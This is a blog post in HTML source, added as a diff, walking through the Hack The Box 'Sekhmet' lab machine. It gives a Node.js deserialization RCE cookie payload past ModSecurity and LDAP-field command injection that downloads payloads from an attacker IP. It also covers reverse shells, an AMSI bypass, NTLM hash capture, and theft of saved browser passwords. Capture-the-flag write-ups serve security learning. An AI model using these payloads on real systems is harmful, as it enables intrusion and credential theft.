@@ -1,0 +1,434 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>HTB - Sekhmet [Insane] // meowmeowattack</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.105.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="meowmeowattack" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.0fb49e70a30412f97ddfc418e18fefef1d9fcdebe45f634dbbba768b00fe1eec.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="HTB - Sekhmet [Insane]"/>
+<meta name="twitter:description" content="Scanning &gt; TARGET=10.129.43.131 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 127 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0)80/tcp open http syn-ack ttl 127 nginx 1.18.0|_http-title: 403 Forbidden|_http-server-header: nginx/1.18.0 Web Enum Simple curl to check headers and basics &gt; curl -i http://10."/>
+
+    <meta property="og:title" content="HTB - Sekhmet [Insane]" />
+<meta property="og:description" content="Scanning &gt; TARGET=10.129.43.131 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmapPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack ttl 127 OpenSSH 8.4p1 Debian 5&#43;deb11u1 (protocol 2.0)80/tcp open http syn-ack ttl 127 nginx 1.18.0|_http-title: 403 Forbidden|_http-server-header: nginx/1.18.0 Web Enum Simple curl to check headers and basics &gt; curl -i http://10." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://meowmeowattack.github.io/htb/sekhmet/" /><meta property="article:section" content="htb" />
+<meta property="article:published_time" content="2022-09-11T23:18:05+13:00" />
+<meta property="article:modified_time" content="2022-09-11T23:18:05+13:00" />
+
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <span class="app-header-title">meowmeowattack</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/">/meow</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/htb/">/htb</a>
+             - 
+          
+          <a class="app-header-menu-item" href="/notes/">/notes</a>
+      </nav>
+      <p>the meow of pentest</p>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">HTB - Sekhmet [Insane]</h1>
+      <div class="post-meta">
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Sep 11, 2022
+        </div>
+        <div>
+          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          9 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <h1 id="scanning">Scanning</h1>
+<pre tabindex="0"><code>&gt; TARGET=10.129.43.131 &amp;&amp; nmap -p$(nmap -p- --min-rate=1000 -T4 $TARGET -Pn | grep ^[0-9] | cut -d &#39;/&#39; -f 1 | tr &#39;\n&#39; &#39;,&#39; | sed s/,$//) -sC -sV -Pn -vvv $TARGET -oN nmap_tcp_all.nmap
+
+PORT   STATE SERVICE REASON          VERSION
+22/tcp open  ssh     syn-ack ttl 127 OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
+80/tcp open  http    syn-ack ttl 127 nginx 1.18.0
+|_http-title: 403 Forbidden
+|_http-server-header: nginx/1.18.0
+</code></pre><h1 id="web-enum">Web Enum</h1>
+<ul>
+<li>Simple curl to check headers and basics</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -i http://10.129.43.131
+</code></pre><ul>
+<li>Found a domain <code>www.windcorp.htb</code>, add to /etc/hosts</li>
+<li>Subdomain enum</li>
+</ul>
+<pre tabindex="0"><code>&gt; wfuzz -c -f subdomains.txt -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u &#34;http://windcorp.htb/&#34; -H &#34;Host: FUZZ.windcorp.htb&#34;
+
+000000048:   403        43 L     162 W      2436 Ch     &#34;portal&#34;
+</code></pre><ul>
+<li>dirsearch</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://portal.windcorp.htb/
+
+[16:36:23] 301 -  183B  - /3rdparty  -&gt;  /3rdparty/                         
+[16:36:28] 200 -  479B  - /About                                            
+[16:36:28] 200 -  479B  - /about
+[16:37:21] 301 -  173B  - /css  -&gt;  /css/                                   
+[16:37:41] 301 -  179B  - /images  -&gt;  /images/                             
+[16:37:51] 200 -    1KB - /login                                            
+[16:37:52] 200 -    1KB - /login/admin/admin.asp                            
+[16:37:52] 200 -    1KB - /login/admin/
+[16:37:52] 200 -    1KB - /login/cpanel/
+[16:37:52] 200 -    1KB - /login/cpanel.aspx
+[16:37:52] 200 -    1KB - /login/
+[16:37:52] 200 -    1KB - /login/administrator/
+[16:37:52] 200 -    1KB - /login/cpanel.html
+[16:37:52] 200 -    1KB - /login/cpanel.php
+[16:37:52] 200 -    1KB - /login/cpanel.jsp
+[16:37:52] 200 -    1KB - /login/cpanel.js
+[16:37:52] 200 -    1KB - /login/super
+[16:37:52] 200 -    1KB - /login/index
+[16:37:52] 200 -    1KB - /login/login                                      
+[16:37:52] 200 -    1KB - /login/oauth/                                     
+[16:37:53] 302 -   23B  - /logout  -&gt;  /                                    
+[16:37:53] 302 -   23B  - /logout/  -&gt;  /
+</code></pre><ul>
+<li>check for common credentials to <a href="http://portal.windcorp.htb">http://portal.windcorp.htb</a>, found valid credential <code>admin:admin</code></li>
+<li>Continue dirsearch after login, found nothing useful.</li>
+</ul>
+<pre tabindex="0"><code>&gt; dirsearch -u http://portal.windcorp.htb/ --cookie=&#34;profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2NjI4NTIxNDUwMjJ9&#34; -x 403
+
+[19:25:45] 301 -  183B  - /3rdparty  -&gt;  /3rdparty/
+[19:25:50] 200 -  479B  - /About
+[19:25:50] 200 -  479B  - /about
+[19:26:47] 301 -  173B  - /css  -&gt;  /css/
+[19:27:09] 301 -  179B  - /images  -&gt;  /images/
+</code></pre><ul>
+<li>When fuzzing after login, need to change the user agent</li>
+</ul>
+<pre tabindex="0"><code>&gt; ffuf -w /usr/share/wordlists/dirb/big.txt -H &#34;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&#34; -H &#34;Cookie: app=s%3A_BLNafoAK_5b8D901vyGdLFtnsyKI5hg.dY63I4%2BEefs9MO7vtDy0qisolrtlFJ27X%2BmDcN0OU4o; profile=eyJ1c2VybmFtZSI6ImFkbWluIiwiYWRtaW4iOiIxIiwibG9nb24iOjE2NjI5MzgzNDI5NDZ9&#34; -X GET -u http://portal.windcorp.htb/FUZZ -mc all -fr &#34;Cannot find&#34; -fs 1066 -c
+
+3rdparty                [Status: 301, Size: 183, Words: 7, Lines: 11, Duration: 305ms]
+About                   [Status: 200, Size: 479, Words: 23, Lines: 1, Duration: 488ms]
+Login                   [Status: 200, Size: 1134, Words: 54, Lines: 1, Duration: 821ms]
+about                   [Status: 200, Size: 479, Words: 23, Lines: 1, Duration: 450ms]
+css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 632ms]
+images                  [Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 378ms]
+login                   [Status: 200, Size: 1134, Words: 54, Lines: 1, Duration: 417ms]
+logout                  [Status: 302, Size: 23, Words: 4, Lines: 1, Duration: 896ms]
+stylesheets             [Status: 301, Size: 189, Words: 7, Lines: 11, Duration: 400ms]
+</code></pre><ul>
+<li>craft a xss returns a waf block message</li>
+</ul>
+<pre tabindex="0"><code>&gt; http://portal.windcorp.htb/%3Cscript%3Eprompt(1)%3C/script%3E
+
+You’ve been blocked for security reasons
+If you believe this is a mistake, please contact the website owner
+and include the request ID number from this page.
+Request ID: c0da38c0c62d7efd Sat Sep 10 2022 20:13:55 GMT-0400 (Eastern Daylight Time)
+This site is protected by ModSecurity
+</code></pre><h1 id="shell-webster">shell: webster</h1>
+<ul>
+<li>Refer to the following articles on modsecurity cookie bypass: <code>key=payload=value</code> and nodejs rce</li>
+<li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a></li>
+<li><a href="https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/">https://www.secjuice.com/modsecurity-vulnerability-cve-2019-19886/</a></li>
+<li>Achieved rce via modsecurity ruleset bypass and nodejs rce</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -i --cookie &#34;app=$cookie_app;profile=$(echo &#39;{&#34;username&#34;:&#34;_$$ND_FUNC$$_function(){require(\&#34;child_process\&#34;).exec(\&#34;curl http://10.10.16.5\&#34;, function(error,stdout, stderr) { console.log(stdout) });}()&#34;}&#39;|base64 -w0)=&lt;original_cookie&gt;&#34; &#39;http://portal.windcorp.htb/&#39;
+</code></pre><ul>
+<li>Generate nodejs payload using <code>nodejsshell.py</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; python2 nodejsshell.py 10.10.16.5 4444
+</code></pre><ul>
+<li>Final payload should look like the following</li>
+</ul>
+<pre tabindex="0"><code>&gt; curl -i --cookie &#34;app=$cookie_app;profile=$(echo &#39;{&#34;username&#34;:&#34;_$$ND_FUNC$$_function(){eval(String.fromCharCode(10,......59,10))}()&#34;}&#39;|base64 -w0)=&lt;original_cookie&gt;&#34; &#39;http://portal.windcorp.htb/&#39;
+</code></pre><h1 id="cracking-the-zip">cracking the zip</h1>
+<ul>
+<li>Found a <code>backup.zip</code> file under <code>/home/webster</code></li>
+<li>Download to local and crack using <code>fcrackzip</code>, but didn&rsquo;t succeed</li>
+</ul>
+<pre tabindex="0"><code>&gt; fcrackzip -D -u -p &#39;/usr/share/wordlists/rockyou.txt&#39; backup.zip
+</code></pre><ul>
+<li>Since we can see some files included in the zip and some of the files are available on the target, bkcrack can be used</li>
+<li><a href="https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack">https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force#known-plaintext-zip-attack</a></li>
+<li>Upload <code>bkcrack</code> to the target</li>
+</ul>
+<pre tabindex="0"><code># create a zip of the passwd file
+&gt; cp /etc/passwd . &amp;&amp; zip passwd.zip passwd
+
+# crack and this produces a sequence of codes
+&gt; ./bkcrack -C backup.zip -c etc/passwd -P passwd.zip -p passwd
+d6829d8d 8514ff97 afc3f825
+
+# set a new pass to the encrypted file
+&gt; ./bkcrack -C backup.zip -U unlocked.zip meow -k d6829d8d 8514ff97 afc3f825
+</code></pre><ul>
+<li>Inspecting <code>var/lib/sss/db/cache_windcorp.htb.ldb</code> found the following account and hash</li>
+</ul>
+<pre tabindex="0"><code>&gt; strings var/lib/sss/db/cache_windcorp.htb.ldb
+
+Ray.Duncan@WINDCORP.HTB
+$6$nHb338EAa7BAeuR0$MFQjz2.B688LXEDsx035.Nj.CIDbe/u98V3mLrMhDHiAsh89BX9ByXoGzcXnPXQQF/hAj5ajIsm0zB.wg2zX81
+</code></pre><ul>
+<li>The hash can be cracked using john</li>
+</ul>
+<pre tabindex="0"><code>&gt; john hash.txt
+
+pantera
+</code></pre><h1 id="user-flag-rayduncan-to-root">user flag: ray.duncan to root</h1>
+<ul>
+<li>login via ssh as ray.duncan</li>
+</ul>
+<pre tabindex="0"><code>&gt; ssh &#39;ray.duncan@windcorp.htb&#39;@10.10.11.179
+
+ray.duncan@windcorp.htb@webserver:/$ id
+uid=1069003229(ray.duncan@windcorp.htb) gid=1069000513(domain users@windcorp.htb) groups=1069000513(domain users@windcorp.htb),1069003601(development@windcorp.htb)
+</code></pre><ul>
+<li>Using kinit for PE</li>
+</ul>
+<pre tabindex="0"><code>ray.duncan@windcorp.htb@webserver:/$ kinit ray.duncan
+Password for ray.duncan@WINDCORP.HTB: 
+
+ray.duncan@windcorp.htb@webserver:/$ ksu 
+Authenticated ray.duncan@WINDCORP.HTB
+Account root: authorization for ray.duncan@WINDCORP.HTB successful
+Changing uid to root (0)
+
+root@webserver:/# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre><ul>
+<li>Previously, we found some firewall rules using linpeas that prevented us from pivoting the traffic, but now the traffic is open</li>
+</ul>
+<pre tabindex="0"><code>[+] Iptables rules
+*filter
+:INPUT ACCEPT [0:0]
+:FORWARD ACCEPT [0:0]
+:OUTPUT ACCEPT [0:0]
+-A OUTPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+-A OUTPUT -p tcp -m multiport --dports 53,80,88,443 -m state --state NEW -j ACCEPT
+-A OUTPUT -p udp -m multiport --dports 53,88,123 -m state --state NEW -j ACCEPT
+-A OUTPUT -p icmp -m comment --comment &#34;Allow Ping to work as expected&#34; -j ACCEPT
+-A OUTPUT -d 192.168.0.0/24 -m owner ! --uid-owner root -m state --state NEW -j DROP
+COMMIT
+
+root@webserver:~/.ssh# nc -vn 192.168.0.2 389
+(UNKNOWN) [192.168.0.2] 389 (ldap) open
+</code></pre><ul>
+<li>Using <code>dig</code>, we locate the next target</li>
+</ul>
+<pre tabindex="0"><code>hope.windcorp.htb.      3600    IN      A       192.168.0.2
+hope.windcorp.htb.      3600    IN      A       10.10.11.179
+</code></pre><ul>
+<li>Scan 192.168.0.2 from the compromised container</li>
+</ul>
+<pre tabindex="0"><code>&gt; for p in {1..65535}; do nc -vn 192.168.0.2 $p -w 1 -z &amp; done 2&gt; output.txt
+
+(UNKNOWN) [192.168.0.2] 22 (ssh) open
+(UNKNOWN) [192.168.0.2] 53 (domain) open
+(UNKNOWN) [192.168.0.2] 80 (http) open
+(UNKNOWN) [192.168.0.2] 88 (kerberos) open
+(UNKNOWN) [192.168.0.2] 389 (ldap) open
+(UNKNOWN) [192.168.0.2] 445 (microsoft-ds) open
+(UNKNOWN) [192.168.0.2] 464 (kpasswd) open
+(UNKNOWN) [192.168.0.2] 3268 (?) open
+(UNKNOWN) [192.168.0.2] 3269 (?) open
+(UNKNOWN) [192.168.0.2] 5985 (?) open
+(UNKNOWN) [192.168.0.2] 9389 (?) open
+(UNKNOWN) [192.168.0.2] 49664 (?) open
+(UNKNOWN) [192.168.0.2] 51648 (?) open
+(UNKNOWN) [192.168.0.2] 58219 (?) open
+(UNKNOWN) [192.168.0.2] 64610 (?) open
+</code></pre><h1 id="setup-pivot">Setup pivot</h1>
+<ul>
+<li>Upload chisel to the compromised container</li>
+</ul>
+<pre tabindex="0"><code># on kali
+# update /etc/proxychains4.conf 
+socks5 127.0.0.1 1080
+&gt; ./chisel server -p 9999 --reverse
+
+# on target
+&gt; ./chisel client --max-retry-count=1 -v 10.10.14.9:9999 R:1080:socks
+</code></pre><h1 id="access-smb-share">Access smb share</h1>
+<ul>
+<li>From kali, request a silver ticket and connect to smb using krb</li>
+</ul>
+<pre tabindex="0"><code># request ticket
+&gt; proxychains getST.py -dc-ip 192.168.0.2 -spn cifs/hope.windcorp.htb &#39;windcorp.htb/ray.duncan:pantera&#39;
+&gt; export KRB5CCNAME=ray.duncan.ccache
+
+# connect to smb
+&gt; proxychains smbclient.py ray.duncan@hope.windcorp.htb -k -no-pass
+</code></pre><ul>
+<li>Browse for contents</li>
+</ul>
+<pre tabindex="0"><code># use WC-Share
+...
+drw-rw-rw-          0  Fri Sep 16 04:26:58 2022 .
+drw-rw-rw-          0  Mon May  2 06:33:07 2022 ..
+-rw-rw-rw-         88  Fri Sep 16 04:26:58 2022 debug-users.txt
+
+# cat debug-users.txt                                                  
+IvanJennings43235345
+MiriamMills93827637
+BenjaminHernandez23232323
+RayDuncan9342211
+</code></pre><h1 id="rce-on-hope">RCE on hope</h1>
+<ul>
+<li>Refer to this for auth method explaination: <a href="https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737">https://gist.github.com/tscherf/a0be193fe7bd603bbe1f511f9a00e737</a></li>
+<li>On the compromised container, dump the ldap database for more information.</li>
+</ul>
+<pre tabindex="0"><code>&gt; ldapsearch -LLLY GSSAPI -H ldap://windcorp.htb -b &#39;DC=windcorp,DC=htb&#39; &gt; ldapinfo.txt
+</code></pre><ul>
+<li>We can change the mobile number of <code>ray.duncan</code>, this field is vulnerable to cmd injection. Structure the payload in the form: <code>mobile: ;&lt;cmd&gt;</code>, following is an example of file upload.</li>
+</ul>
+<pre tabindex="0"><code># create a mod.ldif
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: ;wget http://10.10.14.173/file -O c:\wc-share\file;
+
+# then send to modify the ldap record
+&gt; ldapmodify -Y GSSAPI -H ldap://windcorp.htb -D &#34;CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb&#34; -f mod.ldif
+</code></pre><ul>
+<li>Check the change and wait for a while (2 min period) to observe the request from hope. <strong>Note</strong>: there is a char limit on mobile field (i.e 64)</li>
+</ul>
+<pre tabindex="0"><code>&gt; ldapsearch -LLLY GSSAPI -H ldap://windcorp.htb -b &#39;CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb&#39;
+</code></pre><ul>
+<li>The target is running <strong>applocker</strong>, we can craft a ldif to fetch the applocker policy</li>
+</ul>
+<pre tabindex="0"><code>dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: ;Get-AppLockerPolicy -Effective -Xml &gt; c:\wc-share\u
+</code></pre><ul>
+<li>Reading through the policy, we understand we need to look for a folder where we can write that is not on the exception list. Refer to this for some ideas: <a href="https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56">https://gist.github.com/mattifestation/5f9de750470c9e0e1f9c9c33f0ec3e56</a></li>
+</ul>
+<pre tabindex="0"><code>&lt;FilePathRule Id=&#34;2c47f772-4d79-4493-b64b-613e17f0011c&#34; Name=&#34;All files located in the Windows folder&#34; Description=&#34;Allows members of the Everyone group to run applications that are located in the Windows folder.&#34; UserOrGroupSid=&#34;S-1-1-0&#34; Action=&#34;Allow&#34;&gt;
+    &lt;Conditions&gt;
+        &lt;FilePathCondition Path=&#34;%WINDIR%\*&#34; /&gt;
+    &lt;/Conditions&gt;
+    &lt;Exceptions&gt;
+        ...
+    &lt;/Exceptions&gt;
+</code></pre><ul>
+<li>Another thing we need is to bypass <strong>amsi</strong>, the following post helped a lot: <a href="https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/">https://www.secjuice.com/powershell-constrainted-language-mode-bypass-using-runspaces/</a>, We need to change the code to suit our purpose and compile it</li>
+<li>Following are steps i took to gain a reverse shell, don&rsquo;t forget to use <code>ldapmodify</code> to apply the change for each step.</li>
+</ul>
+<pre tabindex="0"><code># upload the bypass code
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: ;wget http://10.10.14.9/B.exe -O C:\windows\debug\wia\B.exe
+
+# run it
+dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: ;Start-Process -FilePath C:\windows\debug\wia\B.exe
+</code></pre><ul>
+<li>You should now land the DC as <code>scriptrunner</code></li>
+</ul>
+<h1 id="pe-bobwood">PE: bob.wood</h1>
+<ul>
+<li>Upload winpeas and collect info</li>
+</ul>
+<pre tabindex="0"><code>&gt; wget http://10.10.14.51/winPEASx64.exe -O c:\windows\debug\wia\winPEASx64.exe
+
+LanmanCompatibilityLevel    :  (Send NTLMv2 response only - Win7+ default)
+</code></pre><ul>
+<li>Note that ntlmv2 is enabled, can conduct ntlm leak attack using smbserver.</li>
+<li>Download smbserver binary from <a href="https://github.com/ropnop/impacket_static_binaries/releases">https://github.com/ropnop/impacket_static_binaries/releases</a>, use the <code>non-dev</code> version.</li>
+</ul>
+<pre tabindex="0"><code># on webserver (the compromised container)
+&gt; ./smbserver MEOW . -smb2support
+</code></pre><ul>
+<li>Use the following ldif to trigger the DC to browse to our fake smbserver or you can simply run the command on the DC.</li>
+</ul>
+<pre tabindex="0"><code>dn: CN=Ray Duncan,OU=Development,DC=windcorp,DC=htb
+changetype: modify
+replace: mobile
+mobile: ;cd \\webserver.windcorp.htb\MEOW\
+</code></pre><ul>
+<li>Wait for the call back</li>
+</ul>
+<pre tabindex="0"><code>root@webserver:~# ./smbserver MEOW . -smb2support
+Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (192.168.0.2,64447)
+[-] Unsupported MechType &#39;MS KRB5 - Microsoft Kerberos 5&#39;
+[*] AUTHENTICATE_MESSAGE (WINDCORP\scriptrunner,HOPE)
+[*] User HOPE\scriptrunner authenticated successfully
+[*] scriptrunner::WINDCORP:4141414141414141:f22b7ec10c6593b3649ddaea047a7981:0101000000000000006a486dbeced80134d6d338c45cc33d0000000001001000760057004c0055005500450041006f000200100074004600680073006d00460051004b0003001000760057004c0055005500450041006f000400100074004600680073006d00460051004b0007000800006a486dbeced80106000400020000000800300030000000000000000000000000210000fb5ff7cc504681bb86189765b31d067bf38927fe39b5605ade21dfebecb47dcf0a001000000000000000000000000000000000000900360063006900660073002f007700650062007300650072007600650072002e00770069006e00640063006f00720070002e006800740062000000000000000000
+[*] Handle: [Errno 104] Connection reset by peer
+[*] Closing down connection (192.168.0.2,64447)
+[*] Remaining connections []
+</code></pre><ul>
+<li>Crack the hash using hashcat, this is also the password for <code>bob.wood</code></li>
+</ul>
+<pre tabindex="0"><code>&gt; hashcat -m 5600 hash.txt rockyou.txt
+
+!@p%i&amp;J#iNNo1T2
+</code></pre><ul>
+<li>Invoke command as bob.wood, and setup another nc listener to receive the reverse shell. <code>B.exe</code> is the reverse shell with amsi bypass that was previously uploaded.</li>
+</ul>
+<pre tabindex="0"><code>$SecPassword = ConvertTo-SecureString &#39;!@p%i&amp;J#iNNo1T2&#39; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#39;bob.wood&#39;, $SecPassword)
+$session = New-PSSession -Credential $Cred
+Invoke-Command -Session $session -scriptblock { c:\windows\debug\wia\B.exe }
+</code></pre><h1 id="pe-administrator">PE: administrator</h1>
+<ul>
+<li>Upload sharphound and collect data again, it seems that bob.wood is a member of IT, which has PSRemote right to the DC. However, we need to be a domain admin (e.g bob.woodadm) in order to fetch the admin pass. It is a logical thing to assume that bob.wood may use the same computer to login as bob.woodadm for administrative stuff. So, searching in the broswer cache may find useful info.</li>
+<li><code>bob.woodadm</code> credential was saved in Edge, which can be found here: <code>C:\users\bob.wood\appdata\local\microsoft\edge\user data\default\Login Data</code></li>
+<li>Use this tool to decrypt the password: <a href="https://github.com/moonD4rk/HackBrowserData">https://github.com/moonD4rk/HackBrowserData</a></li>
+</ul>
+<pre tabindex="0"><code>PS C:\windows\debug\wia&gt; .\hbd.exe
+[NOTICE] [browsingdata.go:71,Output] output to file results/microsoft_edge_default_password.csv success
+
+PS C:\windows\debug\wia&gt; cat results/microsoft_edge_default_password.csv
+UserName,Password,LoginURL,CreateDate
+bob.woodADM@windcorp.com,smeT-Worg-wer-m024,http://webmail.windcorp.com/login.html,2022-07-04T18:46:59.133335+02:00
+bob.wood@windcorp.htb,SomeSecurePasswordIGuess!09,http://google.com/login.html,2022-07-04T18:14:00.217981+02:00
+bob.wood@windcorp.htb,SemTro?32756Gff,http://somewhere.com/login.html,2022-07-04T18:12:42.849216+02:00
+</code></pre><ul>
+<li>Now, login as bob.woodadm and capture the root flag</li>
+</ul>
+<pre tabindex="0"><code>$SecPassword = ConvertTo-SecureString &#39;smeT-Worg-wer-m024&#39; -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential(&#39;bob.woodADM&#39;, $SecPassword)
+$session = New-PSSession -Credential $Cred
+Invoke-Command -Session $session -scriptblock { c:\windows\debug\wia\B.exe }
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
